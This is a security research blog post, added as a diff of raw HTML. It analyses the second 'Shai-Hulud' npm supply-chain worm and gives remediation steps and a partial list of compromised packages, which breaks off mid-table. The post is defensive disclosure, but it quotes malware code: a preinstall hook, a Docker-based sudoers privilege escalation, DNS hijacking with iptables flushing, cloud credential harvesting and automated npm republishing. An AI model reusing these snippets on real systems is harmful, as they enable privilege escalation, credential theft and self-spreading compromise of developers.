@@ -1,0 +1,3278 @@
+<!DOCTYPE html>
+<html data-html-server-rendered="true" lang="en" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
+  <head>
+    <title>Shai-Hulud, The Second Coming - Ongoing npm supply chain attack - JFrog Security Research</title><meta name="gridsome:hash" content="f23da8a36240bfd0ffff7d6d3d82696212cce01f"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="referrer" content="origin"><meta data-vue-tag="ssr" http-equiv="Content-Security-Policy" content="default-src *  &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27;  https://jfrog.com; img-src &#x27;self&#x27; * data: ; font-src &#x27;self&#x27; * data: ;"><meta data-vue-tag="ssr" name="title" content="Shai-Hulud, The Second Coming - Ongoing npm supply chain attack"><meta data-vue-tag="ssr" name="description" content="Guy Korolevski, Andrii Polkovnychenko and Shavit Satou, JFrog Security Researchers"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.ebe1c983be3d8af04d6186b36f13b87c.png"><link rel="preload" href="/assets/css/0.styles.4ce946dc.css" as="style"><link rel="preload" href="/assets/js/app.0e2b95e3.js" as="script"><link rel="preload" href="/assets/js/page--src--templates--real-time-post-vue.3b205ae6.js" as="script"><link rel="prefetch" href="/assets/js/page--src--pages--404-vue.9f141ac9.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue.4908ccea.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue~page--src--pages--malicious-packages-vue.290eb3ad.js"><link rel="prefetch" href="/assets/js/page--src--pages--malicious-packages-vue.20041e6d.js"><link rel="prefetch" href="/assets/js/page--src--pages--model-threats-vue.09ebe724.js"><link rel="prefetch" href="/assets/js/page--src--pages--oss-vue.8664726d.js"><link rel="prefetch" href="/assets/js/page--src--pages--post-vue.c857a975.js"><link rel="prefetch" href="/assets/js/page--src--pages--vulnerabilities-vue.f6f1a1bf.js"><link rel="prefetch" href="/assets/js/page--src--templates--model-threats-post-vue.ecc53922.js"><link rel="prefetch" href="/assets/js/page--src--templates--post-vue.d2ee2512.js"><link rel="prefetch" href="/assets/js/vendors~page--src--pages--index-vue.2ec3d7ff.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--model-threats-post-vue~page--src--templates--real-time-post-vue.7f393094.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--real-time-post-vue.114325c7.js"><link rel="stylesheet" href="/assets/css/0.styles.4ce946dc.css"><script data-vue-tag="ssr" src="/speedsize-local.js"></script><script data-vue-tag="ssr" src="https://transcend-cdn.com/cm/f0071674-c641-4cf3-9d31-303ec0c86b1b/airgap.js" data-languages="en" data-tracker-overrides="GoogleConsentMode:security_storage=on;ad_storage=SaleOfInfo,Advertising;ad_user_data=SaleOfInfo,Advertising;ad_personalization=SaleOfInfo,Advertising;analytics_storage=Analytics,SaleOfInfo;functionality_storage=Functional,SaleOfInfo;personalization_storage=Functional,SaleOfInfo" data-cfasync="false" type="text/javascript" charset="utf-8"></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8">
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "GTM-T6MF8M");
+      gtag('set', 'developer_id.dODQ2Mj', true);
+    </script><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
+  </head>
+  <body >
+    <div data-server-rendered="true" id="app" class="layout"><header class="py-2 main-header"><div class="container mx-auto px-2"><div class="flex w-full justify-between items-center"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a><span class="site-name small">JFrog Security Research</span></div></div><div class="right"><div class="hidden sm:block desktop-menu-wrapper"><ul class="top-menu flex items-center"><li class="menu-item"><a href="/model-threats/" class="font-bold px-3">
+      Model Threats
+    </a><a href="/vulnerabilities/" class="font-bold px-3 mx-3">
+      Discover
+    </a></li><li><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noreferrer noopener noreferrer" class="sr-button px-3 py-2 inline-flex gap-2">
+  Follow JFrog Security
+  <img alt="twitter" src="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg" width="14" srcset="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg 14w" sizes="(max-width: 14px) 100vw, 14px" class="g-image"></a></li></ul></div><div class="sm:hidden flex item-center mobile-menu-wrapper gap-2"><!----><button class="show-menu-hamburger px-1"><img alt="Menu" src="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg" width="22" srcset="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg 22w" sizes="(max-width: 22px) 100vw, 22px" class="g-image"></button></div></div></div></div><div class="fixed mobile-menu h-screen w-screen z-50 bg-white text-gray-700 p-5 inset-0" style="display:none;"><div class="flex justify-end mb-3"><button class="p-3"><img alt="Menu" src="data:image/svg+xml,%3csvg fill='none' viewBox='0 0 12 12' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3e%3cdefs%3e%3cfilter id='__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79'%3e%3cfeGaussianBlur in='SourceGraphic' stdDeviation='40'/%3e%3c/filter%3e%3c/defs%3e%3cimage x='0' y='0' filter='url(%23__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79)' width='12' height='12' xlink:href='data:image/svg%2bxml%3bbase64%2ciVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAAAsTAAALEwEAmpwYAAAJfklEQVR42u2bCWwVVRSGpwtQWpa2UFpkEWRvUQFBNEqkFMoiIogKFWsFKiAYTTBRoiwulD0KERLBoKAiZRN3UCEiUUBFRWURBFxABCn70va1FM99fhOuw8xjmzd9yXOSP236%2bmbO%2bp9zz71jGOdf8YIWgk6CewU5gvsEPQRtBfUFVQUVjNC6KiBXfeTsgdw56NEJveIvdKNqgmaCdME9gmxBf0E3QRtBXUGcICrEDBCFXHWRsxtyZ6NHOnpVu9CNEgSpgs7cYKDgfkFPQXtBQ6xYSRAZIspHIk888rVH3vuRvz/6pKKf4xUjqCNoJ7hTkCt4VDBcMEDQVdBa0EBQS1BdUJnwiywHpSvw/OrI0wD5uiLvcOTPRZ926BdjzXl1g0Q%2bbCW4XTBUMEYwSZAnGCUYIugj6EiYNRGkkHvRHhsgmuemIEcb5OqDnKOQexJ6DEWvVuiZiN5%2bYmguSMNC6p%2bG8eVXBYsFiwSvCV4UPC14WNAPYmkpSBZU9NgAlVC%2bJXL0Qy4l3wvIuwj556LPMPRrh75KbyMDgugi6I2lJggWCNYIvhN8L9gg%2bESQL5gpGCcYzPcbQ0BeXlXwfAZyjEOufORcj9xK/s/QJw/9eqOv0ttvOVUmsgQPCcbieaX8TkGB4KjgoOA3wSbBKsGbgufINWXRJEGEh/mfxHMHIMebyLUJOQ8idwF6rEGvseiZRXUwHhQ8IBgkeEwwWbAEy6kvn9Xg4287BJ8TWo8LuguaklPRHuR%2bdZ7XnefPRZ4dyOezyF2APkvQ7zH0VXr7m4Us6uVwwn8x4XPUciOFUqy7RfC%2bYBoWzSCv6kCslV1slqI1tr%2bKctYJdp%2bGHFuQq9RG5mNExmL0G4G%2bSm9/x6SahjsIp1EQyAZueNYGhYK9gq8gmkkQkGLgWyAXRVCxLhkghjKnvH4zJc3kqnzk2ItcdvIe4n/mCZ6iP%2bhFBPnbxjY0D5l4U7Hox%2bSSz%2baGZ4iO3YJ1gmUQ0NM0Hp2pLoku8YIZ8ul4TjlpBiH9BTl%2bBLnsZN0DP8ygEnTDkEp3f%2b9cR2si%2bqDIQtJARUGJzY2LBIcFv2vEuACvKCN0ENRzoTyqFrc2Aivln8WTKwUbcUIB8th5XznqJ4ylCPBuFG%2bE7v5yEouVrxbchpVeEnwq2I4RTlvyq4zoOMXnO4mGBTQefQXXEgWXS4wRyNWCkB2F8orwtgn%2bEhwXFNt4v5io2EUFeFnwCNxxDXJVNQkmEk8lEQX3Yq03%2bPJmwugIeWZ9WAmfKSOsFsziYZkIn8IiJIbnRQRQOApZVF9Rk1qfTs5PF6xA%2bYPIUmZxSjFGUcb5WfAlPPE8hN8OeSpbHROBkI154CDC7RXBe5Ci2RcU24RaCUL9IFgumEokKXK9iRxOIeIiAxggFkc0IlS70eiY1WkjyhU6yKAc8Sv/t4KImUB73IUVYbxTVMYgZBqhoiw2EmUWQji7sXCZjQAqHf6AcZfhsSept525b1KAlIgkNJvR12dpz8/Xnn8swPN/x1lLad2f4PkqGq%2bjjMY6RaE5VEgmEnQP5F2CB1T1%2bBaims93c4mshoSf3VURYurAIOMZIvD9i4hAHxGoCPltwRTSpicR2AwyrRaImCPxjl0ODsGjKy8yB/dDoGYOPsu6vDX3jXKYRl0LgY4WvK5x0N4AHOTTOGgVHDSCkG%2bOQ6sS4Ze0dL9cFjYNcRgWVv8/hxY0E2/UwsiViIhE8j6dpmomyigi%2b9uhCpU4VCFlvLtYKSZc6fTqYuuwU0ocwoPv0IfnMrBoj7dbwA03wDsqX8dTt1UfcsChxptl7g%2bI19qH3Mp4zJV23K4Tmw4n6J1YqUPbvEfzzkRtMZJFye2H4sNZ2SneWAubn7S5ZxmR9xvcsJywH23pRBPcWoFZe/Fell58Azl62mHxdBg%2bWItnZ8PQk7nHRJhehf1b9BJbCW2fg/f3Q7RLIbwRhP2tWu/h1lrET4wxREJtHpBOdZgKS28mV4tsvFXIZ2q5%2bg0DCrXW%2bIAeQ%2bFDOs91KP8X%2bW3XdJkGXUEkDoPwWhL2CSgflNF9FIZoQokcSalaA2EdIGx9mvClKFNAzv4CiW6mT/%2bR37fBKeoeJ7Q1SBn3KIRTdlFd5lHne8L2CV7tV0RQytqSx89QslZBXL%2bi7CmUOMPP09p06QBhrDy9D%2bxHwROaAU3FD8Mlm6kqC%2bkvsiHUZK/3KuIoWx1pWkZDREvJdTOMTWVK%2bFmIYU6CExCaiVOkUYlW5v4m5NdRTWZTjcyZZBNzYePlZS6emtO59YXFx8PiJpGZKVGMAYq1333a34owTpH299OWEdwChi%2bPUjk6Mh1Kpp/wfCsqlgamPjU9nWh4DjZfTzoc0jzr09KiTEOpxSCFpMseiHMJFWMwhNeKGUZNotHrfQk/D0RoS%2bl4UiKDSJgFq28jt4%2bjlM%2bhXzDJsgQDnLJMdGdrnaQqxzWoTFHIEGGEwJVIR5dNefwAlt%2bHAYoCKK%2bPsPQWdztz/uk0T%2b1JvVDZlzyvYUqlu1MM/S5t6p8sYYsd5nZ2kWCSn4qgjzDoAJa0cUaIXhVY6PSFDN9heaoboOwSDbCVJmkyq8k06%2bZmOEZAlVA1gFccUMsIgQMaXlcBc57QlTSrqQ02y6UKlEcfMJE%2bIJPJUkMqQpXy6AO87gTX0glOphPsj8HT6AQ9J0av1wI7tLXAHNYCuQw/mhoXcfgplFaDBS6sBvOpNA8w9U3xKg1CaR4wn32HO7TN2IrBIMRgTIRWujARWqlNhDIh4noYwtWJkFszwc8ZpLo5E1zGd0dAxB2CMRN0cyo8ARYfaJw7p3MlU%2bGvtKnwGJqlLoaL5xPc3BeYpNXxGxliNrfsC%2bRc5r7Aas3AgwyXzie4uTM0G893IZqSCNGKQdgZuuzzCcHaG1xI5PSjg6vhsJ53Y29wtWVv0Ho%2bIeDeoNu7w%2bb%2bfB736Ej7GhPE3WHzfMIU47/nE5qxNV49UFq4dT7A3J%2bfztw%2bm0VSKlHl1fkA83xCDrxzvfHveag4uyhw%2b4SI6QHzmH0TIivO8PaEyHzj3AmRTMsGSoRhuH9GKND%2bfCWjfM8Imcd6a%2buNUjBOibm1Px%2bMU2IZRFcNcwHl9jnBPMPd/flgnRNsjMOv%2bKToesP5pKhb%2b/NunxTtbmgnRa/krPDXhvNZ4WQj9M4KK0J8CiP2Qvf/T4uH/fsC4fLGyGfoNcawvDES9u8Mhf1bY%2bHy3uAQw%2bG9QWu5Cbs3R61XWL87bBhh9vb4P/%2bX4wkCBpt7AAAAAElFTkSuQmCC' /%3e%3c/svg%3e" width="12" data-src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" data-srcset="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg 12w" data-sizes="(max-width: 12px) 100vw, 12px" class="g-image g-image--lazy g-image--loading"><noscript><img src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" class="g-image g-image--loaded" width="12" alt="Menu"></noscript></button></div><ul class="mobile-menu-list"><li class="py-4 px-2 border-t border-gray-200"><a href="/" class="text-gray-700 active">
+        Home
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/model-threats/" class="text-gray-700">
+        Model Threats
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/vulnerabilities/" class="text-gray-700">
+        Discover
+      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noopener" class="text-gray-700">
+        Follow JFrog Security
+      </a></li></ul></div></header><div class="latest-posts"><div class="container pt-5 pb-10"><h1 class="mt-3 pb-0">Shai-Hulud, The Second Coming - Ongoing npm supply chain attack</h1><p class="mt-1 mb-5 green">Guy Korolevski, Andrii Polkovnychenko and Shavit Satou, JFrog Security Researchers | November 24, 2025</p><div class="post-content-wrapper"><section class="latest-posts-single-post-content text-black"><p>In September, NPM faced one of its largest compromises, with many packages hijacked and millions of users compromised. Today, the strike was renewed with a new wave of compromised packages. In addition to the <strong>459</strong> publicly identified packages, the JFrog research team identified <strong>181</strong> packages (<strong>630</strong> packages in total) encompassing <strong>823</strong> releases.</p>
+<p>The final payload, similar to the first Shai-hulud attack, is a self-propagating worm that steals the user’s secrets, uploads them to a public GitHub repo, and repacks itself into all of the user's available NPM packages with the malicious payload. </p>
+<h2 id="comparison-to-the-previous-shai-hulud-attack"><a href="#comparison-to-the-previous-shai-hulud-attack" aria-hidden="true" tabindex="-1">Comparison to the previous Shai-Hulud attack</a></h2>
+<p>This time, a malicious payload was found on bun_environment.js instead of bundle.js.<br>
+The former Shai-hulud attack created repositories in GitHub with the exfiltrated credentials called \&#x3C;user>/shai-hulud, whereas this time the payload seems to generate a random repository name, containing the user’s secrets:<br>
+<img src="/img/RealTimePostImage/post/shai-hulud-2-repos.jpeg">
+In the repository's description, you can see that this attack is called “<strong>Sha1-Hulud: The Second Coming.”</strong> By the attackers.<br>
+<img src="/img/RealTimePostImage/post/shai-hulud-comp-repo.jpeg"></p>
+<h2 id="what-to-do-if-you-are-compromised"><a href="#what-to-do-if-you-are-compromised" aria-hidden="true" tabindex="-1">What to do if you are compromised?</a></h2>
+<p>Anyone who has one of the specified versions of the compromised packages should:</p>
+<ol>
+<li>Rotate any access tokens that were stored on the affected machine of the following providers: GitHub, NPM, AWS, GCP, Azure  </li>
+<li>Rotate any access tokens that were stored on the affected machine that TruffleHog can identify. Supported providers can be searched for in <a href="https://github.com/trufflesecurity/trufflehog/tree/main/pkg/detectors" target="_blank" rel="nofollow noopener noreferrer">Trufflehog’s GitHub repository</a>.  </li>
+<li>
+<p>If GitHub access tokens were stored on the affected machine, check the GitHub account for new repositories with a random name, containing one or several of the following files:  </p>
+<ol>
+<li>contents.json  </li>
+<li>environment.json  </li>
+<li>cloud.json  </li>
+<li>actionsSecrets.json  </li>
+<li>truffleSecrets.json  </li>
+</ol>
+</li>
+<li>If npm access tokens were stored on the affected machine, check the npm account for new versions of published packages that contain a postinstall script that runs "node setup_bun.js.js". If found - remove these versions</li>
+</ol>
+<h2 id="payload-planted-by-the-attacker"><a href="#payload-planted-by-the-attacker" aria-hidden="true" tabindex="-1">Payload planted by the attacker</a></h2>
+<p>For compromised packages, inside the <em>package.json</em> file, the attacker added the auto-run:</p>
+<pre><code class="language-json">"scripts": {
+   ....
+   "preinstall": "node setup_bun.js"
+ }
+</code></pre>
+<p>Inside the package's files, we found 2 more files - setup_bun.js and bun_environment.js</p>
+<h2 id="setup_bunjs---what-does-it-do"><a href="#setup_bunjs---what-does-it-do" aria-hidden="true" tabindex="-1">setup_bun.js - what does it do?</a></h2>
+<p>This script installs Bun (if missing) and then executes bun_environment.js, which contains obfuscated code. The main function orchestrates installation and validation:</p>
+<pre><code class="language-javascript">async function main() {
+  let bunExecutable;
+
+  if (isBunOnPath()) {
+    // Use bun from PATH
+    bunExecutable = 'bun';
+  } else {
+    // Check if we have a locally downloaded bun
+    const localBunDir = path.join(__dirname, 'bun-dist');
+    const possiblePaths = [
+      path.join(localBunDir, 'bun', 'bun'),
+      path.join(localBunDir, 'bun', 'bun.exe'),
+      path.join(localBunDir, 'bun.exe'),
+      path.join(localBunDir, 'bun')
+    ];
+
+    const existingBun = possiblePaths.find(p => fs.existsSync(p));
+
+    if (existingBun) {
+      bunExecutable = existingBun;
+    } else {
+      // Download and setup bun
+      bunExecutable = await downloadAndSetupBun();
+    }
+  }
+</code></pre>
+<p>Main function flow:</p>
+<ol>
+<li>Checks if bun is on PATH, uses it if found  </li>
+<li>If not found, checks for local bun in bun-dist/  </li>
+<li>If still not found, downloads and installs Bun  </li>
+<li>Executes bun_environment.js if it exists  </li>
+<li>Exits silently if the file is missing</li>
+</ol>
+<h2 id="dns-hijacking"><a href="#dns-hijacking" aria-hidden="true" tabindex="-1">DNS hijacking</a></h2>
+<p>The affected system (if running systemd) will have its DNS hijacked, assuming that sudo can be used without specifying a password by attempting privilege escalation via Docker:</p>
+<pre><code class="language-javascript">async function pQ0() {
+  try {
+    let {
+      stdout: _0x259d7f,
+      exitCode: _0x2a341e
+    } = await Bun.$`sudo -n true`.nothrow();
+    return _0x2a341e === 0;
+  } catch {
+    try {
+      await Bun.$`docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"`.nothrow();
+    } catch {
+      return false;
+    }
+    return true;
+  }
+}
+
+async function gQ0() {
+  await Bun.$`sudo systemctl stop systemd-resolved`.nothrow();
+  await Bun.$`sudo cp /tmp/resolved.conf /etc/systemd/resolved.conf`.nothrow();
+  await Bun.$`sudo systemctl restart systemd-resolved`.nothrow();
+  await Bun.$`sudo iptables -t filter -F OUTPUT`.nothrow();
+  await Bun.$`sudo iptables -t filter -F DOCKER-USER`.nothrow();
+}
+</code></pre>
+<h2 id=""></h2>
+<h2 id="bun_environmentjs---attack-flow"><a href="#bun_environmentjs---attack-flow" aria-hidden="true" tabindex="-1">bun_environment.js - Attack flow</a></h2>
+<p><strong>Phase 1 - Initialization and environment detection</strong> - checks CI/CD environment, looks up for GITHUB_ACTIONS, CODEBUILD_BUILD_NUMBER, BUILDKITE and CIRCLE_SHA1. If it runs in a CI/CD environment, it tries privilege escalation.</p>
+<p><strong>Phase 2 - Credentials harvesting</strong>, which includes:</p>
+<ol>
+<li>
+<p>Github Token:  </p>
+<ol>
+<li>Searches for - “ghp_”, “gho_”  </li>
+<li>Tries to authenticate using GitHub CLI (gh auth token)  </li>
+<li>Searches for infected repos in the user’s account  </li>
+</ol>
+</li>
+<li>
+<p>NPM  </p>
+<ol>
+<li>NPM_TOKEN env variable check  </li>
+<li>Read ~/.npmrc  </li>
+</ol>
+</li>
+<li>
+<p>Cloud credentials  </p>
+<ol>
+<li>AWS (All regions)  </li>
+<li>GCP  </li>
+<li>Azure</li>
+</ol>
+</li>
+</ol>
+<pre><code class="language-javascript">if (process.env.AWS_ACCESS_KEY_ID &#x26;&#x26; process.env.AWS_SECRET_ACCESS_KEY) {
+    return {
+      accessKeyId: process.env.AWS_ACCESS_KEY_ID,
+      secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
+      token: process.env.AWS_SESSION_TOKEN
+    };
+}
+</code></pre>
+<p> <strong>Phase 3</strong> - <strong>Repository Creation</strong> The script creates a random repo, under the compromised user, with 18 random characters, containing the description "Sha1-Hulud: The Second Coming."<br>
+Additionally, if the user has a workflow scope, it installs a self-hosted runner, hidden in $HOME/.dev-env and creates a workflow file.</p>
+<pre><code class="language-javascript">function generate_random_name() {
+  return Array.from({
+    length: 18
+  }, () => Math.random().toString(36).slice(2, 3)).join("");
+}
+
+if (github.isAuthenticated()) {
+  await github.createRepo(generate_random_name());
+}
+</code></pre>
+<p><strong>Phase 4 - Data exfiltration</strong></p>
+<ol>
+<li>contents.json - System information  </li>
+<li>environment.json - environment variables  </li>
+<li>cloud.json - cloud secrets   </li>
+<li>actionsSecrets.json - GitHub actions secrets  </li>
+<li>truffleSecrets.json - secrets detected by Trufflehog on home directory scanning</li>
+</ol>
+<p><strong>Phase 5 - Supply chain attack</strong><br>
+On NPN - The script finds <strong>all</strong> packages available in user data (up to 100), for each:</p>
+<ol>
+<li>Downloads it  </li>
+<li>Modify package.json with a preinstall command  </li>
+<li>Bundle the payload together  </li>
+<li>Version incrementation  </li>
+<li>Repack  </li>
+<li>Publish to NPM</li>
+</ol>
+<pre><code class="language-javascript">let tmp_dir = await Sy1(a0_0x459ea5.join(a0_0x647ad2.tmpdir(), "npm-update-"));
+let tar_path = a0_0x459ea5.join(tmp_dir, "updated.tgz");
+await Bun.$`npm publish ${tar_path}`.env({
+    ...process.env,
+    NPM_CONFIG_TOKEN: this.token
+});
+</code></pre>
+<p><strong>Phase 6 - Fallback</strong><br>
+If the script could not find a GitHub token and did not find any NPM token, it shows destructive behaviour:</p>
+<ol>
+<li>Windows - Deletion of all user data  </li>
+<li>Unix - shred all files and delete empty directories</li>
+</ol>
+<p>But, if it did find a token, it exits clean</p>
+<p>Newly detected compromised packages (ongoing)</p>
+<p>We’re continuing to track the unfolding compromise of more packages in this campaign. Our monitoring infrastructure has detected additional malicious packages with the same payload (or variations of it):</p>
+<table>
+<thead>
+<tr>
+<th align="left">@accordproject/concerto-linter</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">@accordproject/concerto-linter-default-ruleset</td>
+</tr>
+<tr>
+<td align="left">@accordproject/concerto-metamodel</td>
+</tr>
+<tr>
+<td align="left">@accordproject/concerto-types</td>
+</tr>
+<tr>
+<td align="left">@accordproject/template-engine</td>
+</tr>
+<tr>
+<td align="left">@alaan/s2s-auth</td>
+</tr>
+<tr>
+<td align="left">@antstackio/eslint-config-antstack</td>
+</tr>
+<tr>
+<td align="left">@antstackio/express-graphql-proxy</td>
+</tr>
+<tr>
+<td align="left">@antstackio/graphql-body-parser</td>
+</tr>
+<tr>
+<td align="left">@antstackio/json-to-graphql</td>
+</tr>
+<tr>
+<td align="left">@antstackio/shelbysam</td>
+</tr>
+<tr>
+<td align="left">@clausehq/flows-step-httprequest</td>
+</tr>
+<tr>
+<td align="left">@clausehq/flows-step-mqtt</td>
+</tr>
+<tr>
+<td align="left">@clausehq/flows-step-taskscreateurl</td>
+</tr>
+<tr>
+<td align="left">@commute/market-data-chartjs</td>
+</tr>
+<tr>
+<td align="left">@dev-blinq/blinqioclient</td>
+</tr>
+<tr>
+<td align="left">@dev-blinq/cucumber-js</td>
+</tr>
+<tr>
+<td align="left">@dev-blinq/ui-systems</td>
+</tr>
+<tr>
+<td align="left">@everreal/react-charts</td>
+</tr>
+<tr>
+<td align="left">@everreal/validate-esmoduleinterop-imports</td>
+</tr>
+<tr>
+<td align="left">@faq-component/core</td>
+</tr>
+<tr>
+<td align="left">@faq-component/react</td>
+</tr>
+<tr>
+<td align="left">@fishingbooker/react-loader</td>
+</tr>
+<tr>
+<td align="left">@fishingbooker/react-pagination</td>
+</tr>
+<tr>
+<td align="left">@fishingbooker/react-raty</td>
+</tr>
+<tr>
+<td align="left">@hover-design/core</td>
+</tr>
+<tr>
+<td align="left">@hover-design/react</td>
+</tr>
+<tr>
+<td align="left">@ifings/metatron3</td>
+</tr>
+<tr>
+<td align="left">@lessondesk/electron-group-api-client</td>
+</tr>
+<tr>
+<td align="left">@lessondesk/material-icons</td>
+</tr>
+<tr>
+<td align="left">@lessondesk/react-table-context</td>
+</tr>
+<tr>
+<td align="left">@mparpaillon/page</td>
+</tr>
+<tr>
+<td align="left">@ntnx/passport-wso2</td>
+</tr>
+<tr>
+<td align="left">@ntnx/t</td>
+</tr>
+<tr>
+<td align="left">@osmanekrem/bmad</td>
+</tr>
+<tr>
+<td align="left">@pradhumngautam/common-app</td>
+</tr>
+<tr>
+<td align="left">@pruthvi21/use-debounce</td>
+</tr>
+<tr>
+<td align="left">@relyt/claude-context-core</td>
+</tr>
+<tr>
+<td align="left">@relyt/claude-context-mcp</td>
+</tr>
+<tr>
+<td align="left">@relyt/mcp-server-relytone</td>
+</tr>
+<tr>
+<td align="left">@seezo/sdr-mcp-server</td>
+</tr>
+<tr>
+<td align="left">@sme-ui/aoma-vevasound-metadata-lib</td>
+</tr>
+<tr>
+<td align="left">@suraj_h/medium-common</td>
+</tr>
+<tr>
+<td align="left">@trpc-rate-limiter/cloudflare</td>
+</tr>
+<tr>
+<td align="left">@trpc-rate-limiter/hono</td>
+</tr>
+<tr>
+<td align="left">@varsityvibe/utils</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/alexa-types</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/anthropic</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/api-sdk</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/backend-utils</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/base-types</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/body-parser</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/chat-types</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/circleci-config-sdk-orb-import</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/commitlint-config</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/common</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/default-prompt-wrappers</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/dependency-cruiser-config</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/dtos-interact</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/encryption</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/eslint-config</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/eslint-plugin</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/exception</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/fetch</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/general-types</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/git-branch-check</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/google-dfes-types</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/google-types</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/husky-config</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/logger</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/metrics</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/natural-language-commander</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/nestjs-common</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/nestjs-mongodb</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/nestjs-rate-limit</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/nestjs-redis</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/nestjs-timeout</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/npm-package-json-lint-config</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/openai</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/pino</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/pino-pretty</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/prettier-config</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/react-chat</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/runtime</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/runtime-client-js</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/sdk-runtime</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/secrets-provider</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/semantic-release-config</td>
+</tr>
+<tr>
+<td align="left">@voiceflow/serverless-plugin-typescript</td>
+</tr>
+<tr>
